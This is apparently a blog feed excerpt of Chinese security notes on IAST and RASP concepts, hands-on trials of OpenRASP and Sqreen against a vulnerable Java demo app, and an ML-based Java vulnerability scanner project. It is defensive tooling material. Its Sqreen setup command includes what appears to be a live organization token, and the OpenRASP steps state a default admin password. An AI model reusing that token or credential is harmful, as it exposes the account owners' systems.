      &lt;p&gt;母校计算机院的李樾、谭添老师讲的课，听了第一节课就哭了，决定做一下笔记，课程网站 &lt;a href=&quot;https://pascal-group.bitbucket.io/teaching.html。&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://pascal-group.bitbucket.io/teaching.html。&lt;/a&gt;&lt;/p&gt;&lt;h1 id=&quot;PL知识体系&quot;&gt;&lt;a href=&quot;#PL知识体系&quot; class=&quot;headerlink&quot; title=&quot;PL知识体系&quot;&gt;&lt;/a&gt;PL知识体系&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;/pl-静态程序分析课程笔记（简介）/image-20200802113608162.png&quot; alt=&quot;image-20200802113608162&quot;&gt;&lt;/p&gt;&lt;p&gt;如上图所示，主要分三大块，理论部分包含语言设计、类型系统、语义和逻辑检查；环境部分包含编译器和运行时设计等；应用部分包含程序分析、程序验证和程序生成等，本课程主要关注于应用方面的程序分析。&lt;/p&gt;
    
    </summary>
    
      <category term="Program Language" scheme="http://anemone.top/categories/Program-Language/"/>
    
    
      <category term="白盒扫描" scheme="http://anemone.top/tags/%E7%99%BD%E7%9B%92%E6%89%AB%E6%8F%8F/"/>
    
      <category term="静态程序分析" scheme="http://anemone.top/tags/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90/"/>
    
      <category term="数据流分析" scheme="http://anemone.top/tags/%E6%95%B0%E6%8D%AE%E6%B5%81%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>悬镜技术分享笔记——灰盒测试</title>
    <link href="http://anemone.top/iast-%E6%82%AC%E9%95%9C%E6%8A%80%E6%9C%AF%E5%88%86%E4%BA%AB%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E7%81%B0%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <id>http://anemone.top/iast-悬镜技术分享笔记——灰盒测试/</id>
    <published>2020-06-14T08:21:52.000Z</published>
    <updated>2020-06-14T09:12:54.574Z</updated>
    
    <content type="html"><![CDATA[<p>悬镜的一个技术分享会，大致讲了三种IAST的实现，这里做一个笔记总结。</p><h1 id="IAST简介"><a href="#IAST简介" class="headerlink" title="IAST简介"></a>IAST简介</h1><p>IAST (Interactive Application Security Testing) 也叫灰盒测试，即介于白盒和黑盒之间的一种测试，这一场景下的技术不但关注程序输入输出信息（像黑盒程序那样），还可以（注意只是可以，后面会细说）了解部分程序内部逻辑（像白盒测试那样）。因此具备黑白盒测试的优点，被认为是下一代安全扫描技术，被各个行业所关注。许多黑白盒测试技术稍加改造和结合，就可以变为灰盒测试技术。</p><a id="more"></a><p><img src="/iast-悬镜技术分享笔记——灰盒测试/InkedImage-1592125628662_LI.jpg" alt="Image"></p><h2 id="与RASP的关系"><a href="#与RASP的关系" class="headerlink" title="与RASP的关系"></a>与RASP的关系</h2><p>RASP（Runtime Application Self-protection）是指在程序运行时对程序行为进行保护，可以看做是一个精确到函数级别的WAF，个人认为RASP是IAST的一部分，两者使用的技术是有重叠的，比如说后文提到的基于插桩的IAST实现。</p><h1 id="IAST分类"><a href="#IAST分类" class="headerlink" title="IAST分类"></a>IAST分类</h1><p>在大方向上，主要有两种，而在插桩技术实现时又会有分支：</p><ul><li>基于流量</li><li>基于插桩<ul><li>主动型IAST</li><li>被动型IAST</li></ul></li></ul><h2 id="基于流量的IAST"><a href="#基于流量的IAST" class="headerlink" title="基于流量的IAST"></a>基于流量的IAST</h2><p>基于流量的IAST是指通过爬虫+被动式黑盒扫描器实现的IAST技术，比如说crawlergo+xray的配置，这类技术的主要优势在于：</p><ol><li><p>基于现成技术，改造简单</p></li><li><p>不限语言，技术通用</p></li><li><p>扫描报告可以直接用于漏洞验证和利用</p></li><li><p>相较于插桩能扫描更多类型漏洞（如BAC）</p></li></ol><h2 id="基于插桩的IAST"><a href="#基于插桩的IAST" class="headerlink" title="基于插桩的IAST"></a>基于插桩的IAST</h2><p>基于插桩的IAST主要是利用代码插桩技术，在目标应用的关键类、方法中插入检测逻辑，如在Java中，可以用字节码操作框架（如：ASM、Javaassist、Aspectj等）修改类和方法，通过程序反馈检测程序漏洞，这类技术的优势在于：</p><ol><li>无需重放、无脏数据</li><li>更高的准确性</li><li>解决签名校验、限制数据重放等问题</li></ol><h3 id="主动型IAST"><a href="#主动型IAST" class="headerlink" title="主动型IAST"></a>主动型IAST</h3><p>主动型IAST是指仍然保留黑盒扫描器，只在安全敏感函数（污点分析中的sink ）上插桩，通过检测函数参数是否是预定义的payload，检查程序是否有漏洞，如下图，agent端可以检测到扫描器发来的payload已经作为<code>executeQuery()</code>的参数，因此报告漏洞，或是拦截（RASP）。插桩程序可以同时拿到返回函数调用栈、代码行号以及请求数据。</p><p><img src="/iast-悬镜技术分享笔记——灰盒测试/Image.png" alt="主动型IAST"></p><h3 id="被动型IAST"><a href="#被动型IAST" class="headerlink" title="被动型IAST"></a>被动型IAST</h3><p>被动型IAST是指使用动态污点分析技术，不需要扫描端，直接判断敏感参数是否为用户可控。个人认为是技术难度最高的一种IAST，因为插桩程序需要实现动态污点分析逻辑，实时监控程序污点数据变化，检测污点是否由source传播到sink点。</p><p>如下图所示，通过污点分析，用户产生的输入可以直接产生漏洞报告：</p><p><img src="/iast-悬镜技术分享笔记——灰盒测试/Image-1592125395631.png" alt="被动型IAST"></p><p>被动型IAST的好处在于其完全不会影响正常业务，并且大大提高扫描覆盖率，然而个人认为动态污点传播也会有过污染和欠污染问题，并且其本身并不能很好的处理分支覆盖问题，可以说在这一方面还存在着诸多挑战。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>分享会因为有些涉及到技术细节，大佬还是有所保留，不过大致理清楚了IAST的三大工作模式和对应的技术，算是一次科普性的分享，感谢宁戈大佬！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;悬镜的一个技术分享会，大致讲了三种IAST的实现，这里做一个笔记总结。&lt;/p&gt;&lt;h1 id=&quot;IAST简介&quot;&gt;&lt;a href=&quot;#IAST简介&quot; class=&quot;headerlink&quot; title=&quot;IAST简介&quot;&gt;&lt;/a&gt;IAST简介&lt;/h1&gt;&lt;p&gt;IAST (Interactive Application Security Testing) 也叫灰盒测试，即介于白盒和黑盒之间的一种测试，这一场景下的技术不但关注程序输入输出信息（像黑盒程序那样），还可以（注意只是可以，后面会细说）了解部分程序内部逻辑（像白盒测试那样）。因此具备黑白盒测试的优点，被认为是下一代安全扫描技术，被各个行业所关注。许多黑白盒测试技术稍加改造和结合，就可以变为灰盒测试技术。&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>OpenRASP初探</title>
    <link href="http://anemone.top/iast-OpenRASP%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-OpenRASP初探/</id>
    <published>2020-06-14T08:17:12.000Z</published>
    <updated>2020-06-29T09:07:15.622Z</updated>
    
    <content type="html"><![CDATA[<p>OpenRASP是一种较为成熟的RASP技术开源实现，技术思路主要是上一篇文章中的主动型RASP原理，详细可以见<a href="https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals" target="_blank" rel="noopener">hook函数列表</a>（商业版有动态污点追踪），本文为试用报告，之后有时间会深入看看代码。</p><h1 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h1><h2 id="安装后台"><a href="#安装后台" class="headerlink" title="安装后台"></a>安装后台</h2><ol><li><p>安装MongoDB和ElasticSearch（5.6~6）</p></li><li><p>在<a href="https://packages.baidu.com/app/openrasp/release/latest/" target="_blank" rel="noopener">https://packages.baidu.com/app/openrasp/release/latest/</a>下载<code>rasp-cloud.tar.gz</code></p></li><li><p>解压并配置<code>conf/app.conf</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[prod]</span><br><span class="line">EsAddr = http://127.0.0.1:9200</span><br><span class="line">EsUser =</span><br><span class="line">EsPwd =</span><br><span class="line">MongoDBAddr = 127.0.0.1:27017</span><br><span class="line">MongoDBUser =</span><br><span class="line">MongoDBPwd =</span><br></pre></td></tr></table></figure></li><li><p>启动<code>./rasp-cloud -d</code>，用户名密码为<code>openrasp::admin@123</code>，后台如下图所示：</p><p><img src="/iast-OpenRASP初探/image-20200629161638149.png" alt="image-20200629161638149"></p></li></ol><a id="more"></a><h2 id="安装agent"><a href="#安装agent" class="headerlink" title="安装agent"></a>安装agent</h2><p>这里只使用Spring Boot的用法：</p><ol><li><p>半自动化安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar RaspInstall.jar -nodetect -install &lt;project_target&gt;  -heartbeat 90 -appid &lt;id&gt; -appsecret &lt;secret&gt; -backendurl &lt;url&gt;</span><br></pre></td></tr></table></figure></li><li><p>重启Spring Boot</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -javaagent:/mnt/d/java-sec-code/target/rasp/rasp.jar  -jar /mnt/d/java-sec-code/target/java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure><p>可以看到主机上线：</p><p><img src="/iast-OpenRASP初探/image-20200629165551559.png" alt="image-20200629165551559"></p></li></ol><h1 id="功能使用"><a href="#功能使用" class="headerlink" title="功能使用"></a>功能使用</h1><p>主要拿Java-sec-code试用了一下，效果还是很不错的，除了一个PathTraversal没检查出来，其他的都查到了：</p><p><img src="/iast-OpenRASP初探/image-20200629170641757.png" alt="image-20200629170641757"></p><p>至于那个pathtranversal没查出来的问题后面可以再看一下。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ul><li>OpenRASP官网，<a href="https://rasp.baidu.com/" target="_blank" rel="noopener">https://rasp.baidu.com/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;OpenRASP是一种较为成熟的RASP技术开源实现，技术思路主要是上一篇文章中的主动型RASP原理，详细可以见&lt;a href=&quot;https://rasp.baidu.com/doc/hacking/architect/hook.html?from=openrasp_internals&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;hook函数列表&lt;/a&gt;（商业版有动态污点追踪），本文为试用报告，之后有时间会深入看看代码。&lt;/p&gt;&lt;h1 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h1&gt;&lt;h2 id=&quot;安装后台&quot;&gt;&lt;a href=&quot;#安装后台&quot; class=&quot;headerlink&quot; title=&quot;安装后台&quot;&gt;&lt;/a&gt;安装后台&lt;/h2&gt;&lt;ol&gt;
&lt;li&gt;&lt;p&gt;安装MongoDB和ElasticSearch（5.6~6）&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;在&lt;a href=&quot;https://packages.baidu.com/app/openrasp/release/latest/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://packages.baidu.com/app/openrasp/release/latest/&lt;/a&gt;下载&lt;code&gt;rasp-cloud.tar.gz&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;解压并配置&lt;code&gt;conf/app.conf&lt;/code&gt;：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[prod]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsAddr = http://127.0.0.1:9200&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;EsPwd =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBAddr = 127.0.0.1:27017&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBUser =&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;MongoDBPwd =&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;启动&lt;code&gt;./rasp-cloud -d&lt;/code&gt;，用户名密码为&lt;code&gt;openrasp::admin@123&lt;/code&gt;，后台如下图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/iast-OpenRASP初探/image-20200629161638149.png&quot; alt=&quot;image-20200629161638149&quot;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>Sqreen初探</title>
    <link href="http://anemone.top/iast-Sqreen%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/iast-Sqreen初探/</id>
    <published>2020-06-04T08:37:37.000Z</published>
    <updated>2020-06-05T03:06:12.004Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.sqreen.com/" target="_blank" rel="noopener">Sqreen</a> 作为一款IAST产品，用户在项目中导入他们的agent，之后可在控制台查看检测到的安全风险，并进行防御（RASP）。</p><h1 id="技术介绍"><a href="#技术介绍" class="headerlink" title="技术介绍"></a>技术介绍</h1><p>如下图所示，Sqreen主要由三个组件组成，MicroAgent、Security Engine和Sqreen Platform，Security Engine部署于MicroAgent内部，开发者只要在启动应用时倒入MicroAgent即可，Platform主要用于接收Agent信息并且可视化给用户。</p><a id="more"></a><p><img src="/iast-Sqreen初探/how-it-works-together-1.png" alt="img"></p><p>可见MicroAgent是其主要部件，主要有以下功能：</p><ul><li>动态插桩</li><li>监控程序并收集信息</li><li>根据安全引擎指示执行安全响应</li><li>与Platform通信</li></ul><h1 id="防御技术"><a href="#防御技术" class="headerlink" title="防御技术"></a>防御技术</h1><p>从下图可以看到Sqreen使用多层次保护应用程序，这里主要介绍In-App WAF 和 RASP。</p><p><img src="/iast-Sqreen初探/defense-in-depth.png" alt="img"></p><h2 id="In-App-WAF"><a href="#In-App-WAF" class="headerlink" title="In-App WAF"></a>In-App WAF</h2><p>应用内WAF是第一道防线，和外部防火墙一样，主要通过模式匹配来检测和阻止恶意流量，但与外部WAF不同的是，应用内WAF可以根据当前应用的数据库、框架和编程语言应用不同的规则，提高效率。</p><p>如下图，在新建一个规则时，可以选择匹配报文的哪些字段（其实感觉跟外部WAF一样）</p><p><img src="/iast-Sqreen初探/image-20200604191023036.png" alt="image-20200604191023036"></p><p>接着可以选择对字段的匹配规则</p><p><img src="/iast-Sqreen初探/image-20200604191224862.png" alt="image-20200604191224862"></p><p>其中hasSQLinjection和hasXSSinjection这两个实际上是预定义的正则，类似下图所示：</p><p><img src="/iast-Sqreen初探/image-20200604192113549.png" alt="image-20200604192113549"></p><p>下图可以看出<strong>In-App WAF与外部WAF的区别</strong>，即与本应用无关的其他技术被Disabled：</p><p><img src="/iast-Sqreen初探/image-20200604191940016.png" alt="image-20200604191940016"></p><h2 id="RASP-Runtime-Application-Self-Protection"><a href="#RASP-Runtime-Application-Self-Protection" class="headerlink" title="RASP(Runtime Application Self-Protection)"></a>RASP(Runtime Application Self-Protection)</h2><p>RASP是存在很久的概念了（目前还没深入学习，后期会补上技术原理），这里系统支持以下漏洞的防御：</p><p><img src="/iast-Sqreen初探/image-20200604171427705.png" alt="image-20200604171427705"></p><h2 id="In-App-WAF-v-s-RASP"><a href="#In-App-WAF-v-s-RASP" class="headerlink" title="In-App WAF v.s. RASP"></a>In-App WAF v.s. RASP</h2><p>从技术原理上可以看到两者的区别，In-App WAF本质还是WAF，通过正则规则匹配拦截恶意流量，而RASP则是hook了关键api，通过动态污点分析等方式实现高精度的防御。</p><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><ol><li><p>申请适用后，点击“Connect a new application”：</p><p><img src="/iast-Sqreen初探/image-20200604164240814.png" alt="image-20200604164240814"></p></li><li><p>进入部署引导界面，选择语言和项目名称，点击“show instructions”后可以看到部署的java agent：</p><p><img src="/iast-Sqreen初探/image-20200604164525671.png" alt="image-20200604164525671"></p><p>按右侧指示操作即可，同时可以看到对于java是使用javaagent实现的，估计是hook了一些函数。</p></li><li><p>对于Java项目，下载agent，并加参数重启应用（产品上线时可以用SDK集成的方案，详情见<a href="https://docs.sqreen.com/java/user-monitoring/" target="_blank" rel="noopener">https://docs.sqreen.com/java/user-monitoring/</a>）：</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl https://download.sqreen.com/java/sqreen.jar -o sqreen.jar</span><br><span class="line">java -javaagent:sqreen.jar -Dsqreen.token=env_org_dd05c0b8eb3317bbbc7857420ec86abe2ea5aa347ffc6c3efc8ef060 -Dsqreen.app_name=JavaDemo -jar java-sec-code-1.0.0.jar</span><br></pre></td></tr></table></figure></li></ol><pre><code>可以看到Web页面最下面，有应用上线了：![image-20200604170231764](iast-Sqreen初探/image-20200604170231764.png)</code></pre><h1 id="试用结果"><a href="#试用结果" class="headerlink" title="试用结果"></a>试用结果</h1><p>Java方面尝试了一下<a href="https://github.com/JoyChou93/java-sec-code" target="_blank" rel="noopener">JavaSecCode</a>，反射型/存储型XSS、SQLi、命令注入、XXE都没能检测到，估计是WAF那边估计是规则问题，RASP因为文档里没有介绍具体原理，不好给出解释。</p><p>Nodejs方面原本想尝试用<a href="https://github.com/Anemone95/NodeSecCode" target="_blank" rel="noopener">NodeSecCode</a>试一下的，但是测试发现Sqreen并不支持egg框架，在app.js加入require后会报如下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">It seems that the following modules have been required before Sqreen:</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/debug/src/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/graceful-process/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg-logger/index.js</span><br><span class="line">- /mnt/d/nodejsSecCode/backend/node_modules/egg/index.js</span><br><span class="line">Sqreen may not be able to protect the whole application.</span><br><span class="line">If you think this is an error, please report it to Sqreen team.</span><br><span class="line">Read more on https://doc.sqreen.io/docs/nodejs-agent-installation</span><br></pre></td></tr></table></figure><p>于是手写一简单的express服务，含一个反射xss代码，SqreenAgent可以成功部署，但是仍没有发现该漏洞。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Sqreen 主要利用动态插桩技术实现了IAST，但是实际测试来看效果并不是很好（不论Java还是Nodejs都没有发现漏洞），官方推荐是配合<a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a>进行扫描，也就是说，本产品由于规则和设计等原因，还是需要结合传统黑盒扫描的爬虫或Payload才能有效果。</p><h1 id="相关资料"><a href="#相关资料" class="headerlink" title="相关资料"></a>相关资料</h1><ul><li><p>Sqreen官方文档，<a href="https://docs.sqreen.com/" target="_blank" rel="noopener">https://docs.sqreen.com/</a></p></li><li><p>Sqreen GitHub，<a href="https://github.com/sqreen" target="_blank" rel="noopener">https://github.com/sqreen</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;a href=&quot;https://www.sqreen.com/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sqreen&lt;/a&gt; 作为一款IAST产品，用户在项目中导入他们的agent，之后可在控制台查看检测到的安全风险，并进行防御（RASP）。&lt;/p&gt;&lt;h1 id=&quot;技术介绍&quot;&gt;&lt;a href=&quot;#技术介绍&quot; class=&quot;headerlink&quot; title=&quot;技术介绍&quot;&gt;&lt;/a&gt;技术介绍&lt;/h1&gt;&lt;p&gt;如下图所示，Sqreen主要由三个组件组成，MicroAgent、Security Engine和Sqreen Platform，Security Engine部署于MicroAgent内部，开发者只要在启动应用时倒入MicroAgent即可，Platform主要用于接收Agent信息并且可视化给用户。&lt;/p&gt;
    
    </summary>
    
      <category term="IAST" scheme="http://anemone.top/categories/IAST/"/>
    
    
      <category term="IAST" scheme="http://anemone.top/tags/IAST/"/>
    
      <category term="RASP" scheme="http://anemone.top/tags/RASP/"/>
    
  </entry>
  
  <entry>
    <title>毕设：基于机器学习的Java漏洞扫描系统</title>
    <link href="http://anemone.top/whitebox-%E6%AF%95%E8%AE%BE%E5%9F%BA%E4%BA%8E%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%9A%84Java%E6%BC%8F%E6%B4%9E%E6%89%AB%E6%8F%8F%E7%B3%BB%E7%BB%9F/"/>
    <id>http://anemone.top/whitebox-毕设基于机器学习的Java漏洞扫描系统/</id>
    <published>2020-05-28T12:30:49.000Z</published>
    <updated>2020-05-28T11:45:51.032Z</updated>
    
    <content type="html"><![CDATA[<p><strong>本文首次发表在<a href="https://www.toutiao.com/i6826913540683596300/" target="_blank" rel="noopener">慕测头条公众号</a>，这里只作归档用</strong></p><h1 id="背景意义"><a href="#背景意义" class="headerlink" title="背景意义"></a>背景意义</h1><p>随着人们对软件安全的不断重视，静态安全扫描系统被部署于开发流程。相对于其他传统分析方法，污点分析技术由于具有较高的可解释性和准确性，目前作为挖掘 Web 漏洞的常用技术，广泛应用于开源和商用扫描器中。</p><p>然而，污点分析方法存在种种不足。首先，污点分析无法处理容器类型，静态污点分析只能将容器变量（如Map、List变量）的传播规则设为传播/不传播污点，造成过污染/欠污染；其次，污点分析无法处理控制流，污点分析并不能识别用于检查数据是否合法的分支语句，导致误报；最后，污点分析无法处理特殊的传播条件，如SSRF漏洞要求攻击者能操纵域名，若污点拼接在URL参数部分，则代码不存在漏洞，而污点分析仍会报告漏洞。为解决这些问题，目前安全工程师只有手动设计精巧的规则，可即使这样仍会产生大量误报甚至漏报。</p><a id="more"></a><p>为解决传统分析方法高误报、需要花大量人力定义规则等问题，随着机器学习领域的不断发展，学术界一直在探索机器学习在静态安全扫描上的应用。李珍等学者使用后向程序切片结合BLSTM神经网络进行漏洞挖掘[1]，然而他们的工具只能用于C/C++编写的软件，Koc 等学者提出使用类似技术对Java代码漏洞进行过滤[2,3]，通过预测误报提高扫描结果准确性，实验证明该工具具有很好的效果，然而由于传统程序切片过于耗时，其工作只能对污点传播的最后一段函数体进行切片，污点传播是否能够传播并不等价于污点是否能够在汇聚点传播，因此他们的工作无法用于实际场景。</p><p>可见，一款实际可用的基于机器学习的Java静态漏洞扫描系统能有效减轻工程师工作量，在快速开发软件的同时保证软件安全性。</p><h1 id="系统介绍"><a href="#系统介绍" class="headerlink" title="系统介绍"></a>系统介绍</h1><p>本系统结合最新学术界成果，面向 Web 开发常用的 Java 语言，利用污点分析、程序切片和 BLSTM 为开发或安全工程师提供更准确的代码扫描服务。其工作流程如下图所示，工程师在系统中新建扫描项目，在项目中提交源代码和Jar包；污点分析模块对 Jar 包进行污点分析，得到污点传播报告，污点报告中包含有漏洞实例和对应的污点传播树；程序切片模块将对传播树分解为污染流，并对每一污染流进行切片；数据预处理模块对切片进行泛化和向量化处理，得到切片的特征向量；预测模块通过BLSTM模型对切片进行预测，从而推导漏洞是否为误报；至此，系统将更精准的漏洞报告返回至用户。</p><p><img src="/whitebox-毕设基于机器学习的Java漏洞扫描系统/overview169-1590658589087.png" alt="overview169"></p><p>在污点传播过程中，系统对FindSecBugs的污点分析过程进行改造，使其在报告中返回污点传播树，污点传播树表示污点的唯一传播路径，为程序切片提供依据。例如，对于代码 1 来说，在污点传播报告中返回如图 1所示的传播树，可见传播树的树根为污点入口函数上下文，叶子节点为函数调用或返回语句，且叶子节点存在顺序，且终止于汇聚点，注意尽管代码中存在if分支，但有的分支返回语句与污点无关，因此最终只有一个污点传播树。</p><p>在程序切片过程中，系统对污点分析报告中的漏洞实例进行切片，为解决切片规模巨大造成扫描时间过长甚至扫描失败的问题，在切片前，系统通过限制调用图节点个数保证切片快速完成；同时，为保证切片覆盖污点传播全阶段，系统对一个漏洞进行分段切片，对于一个漏洞的每一传播树，将其拆解为污点传播片段，由“函数摘要→兴趣点行号”二元组表示，再对每个片段进行切片，例如图 1 的污点传播树，将会产生<strong>doGet()→line:5</strong>、<strong>filter()→line:13</strong>和<strong>sink()→line:17</strong> 3个切片。</p><p><img src="/whitebox-毕设基于机器学习的Java漏洞扫描系统/代码1和图1.png" alt="代码1和图1"></p><p>在预处理过程中，系统对每一切片进行泛化和向量化处理，图 4 将说明泛化过程，图中左侧为原始切片输出，其每行代表一个SDG节点，SDG节点由“序号：：节点类型：：指令类型：：返回值：：具体内容”构成，预处理过程保留节点类型、指令类型和具体内容，并对切片中数字常量、字符串常量、变量、函数调用和类名方法名进行抽象，经过泛化后切片如右侧所示。向量化过程将泛化后的单词序列转化为数字向量，用于传入神经网络。</p><p><img src="/whitebox-毕设基于机器学习的Java漏洞扫描系统/image-20200528173120092.png" alt="image-20200528173120092"></p><p>在误报预测过程中，系统首先通过BLSTM神经网络预测每一污点传播片段是否可以传播污点，再通过污点传播规则推导漏洞是否为误报，即：若传播树中国任意一个阶段不能传播污点，那么该传播树无法利用；若漏洞中所有传播树无法利用，那么标记该漏洞为误报。例如代码 1 中，首先BLSTM模型很可能预测到<strong>filter()→line:13</strong> 切片无法传播污点，因此对应的污点传播树不可利用，又因为漏洞只有一个传播树，因此系统判断漏洞为误报。</p><p>下图展示了系统中代码 1的预测结果，该实例的节点已经变灰，且预测显示为“[P:FP]”（误报），左下方被预测为清洁函数已由清洁标记标注，这些标记向用户解释系统为何将其预测为误报，这说明本系统是真实有效的。</p><p><img src="/whitebox-毕设基于机器学习的Java漏洞扫描系统/图3.png" alt="图3"></p><p>对于污点传播报告，用户可以标记为正报或误报。对于正报，用户需至少指定一个可利用的污点传播树；对于误报，用户需指定若干条污点无法传播的片段，直到系统根据污点传播规则将其推导为误报。</p><h1 id="项目效益"><a href="#项目效益" class="headerlink" title="项目效益"></a>项目效益</h1><p>为证明系统准确性，本文将本系统与目前流行的扫描工具 FindSecBugs 对比，以OWASP Benchmark v1.1中污点传播类漏洞作为数据集，比较两者的准确率（Accuracy）、精确率（Precision）、召回率（Recall）和 F1。</p><p><img src="/whitebox-毕设基于机器学习的Java漏洞扫描系统/image-20200528173454324.png" alt="image-20200528173454324"></p><p>结果如图 4 所示。可以看出，为了不发生漏报，Find Security Bugs 产生非常高的误报率（误报率为1-65.09%=34.91%）从而导致准确率和 F1 值水平也较低，不准确的漏洞报告不仅会给安全工程师造成巨大压力，更可能造成项目开发进度被阻塞，而本系统结合污点分析和机器学习的优势，仅牺牲 11.35% 的召回率，将精确率提高到 90% 以上，即平均系统中报告的 10 个漏洞中，只有一例可能为误报。在准确率和 F1 指标上也远高于 Find Security Bugs，这说明牺牲召回率具有较高的收益比。</p><p>综上，相较于传统污点分析类扫描器，本系统能更准确地发现漏洞，并且以较小的代价提升准确性。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文介绍了一款基于机器学习的Java静态漏洞扫描系统，基于学术界前沿工作，相对于传统扫描工具本系统能提供更准确的扫描结果，同时系统解决了学术工具只能应对小规模程序的问题，使其可用于实际生产环境。在未来工作中，我们将会覆盖更多漏洞类型、扩充学习数据并对特定漏洞独立训练模型，使扫描报告更加准确。</p><h1 id="相关链接"><a href="#相关链接" class="headerlink" title="相关链接"></a>相关链接</h1><ol><li><p>Li Z, Zou D, Xu S, et al. Vuldeepecker: A deep learning-based system for vulnerability detection[J]. // Proceedings of the 2018 Network and Distributed System Security Symposium </p></li><li><p>Koc U, Saadatpanah P, Foster J S, et al. Learning a classifier for false positive error reports emitted by static code analysis tools[C]//Proceedings of the 1st ACM SIGPLAN International Workshop on Machine Learning and Programming Languages. 2017: 35-42.</p></li><li><p>Koc U, Wei S, Foster J S, et al. An Empirical Assessment of Machine Learning Approaches for Triaging Reports of a Java Static Analysis Tool[C]//Proceedings of the 12th IEEE Conference on Software Testing, Validation and Verification (ICST). IEEE, 2019: 288-299.</p></li></ol>]]></content>
    
    <summary type="html">
    
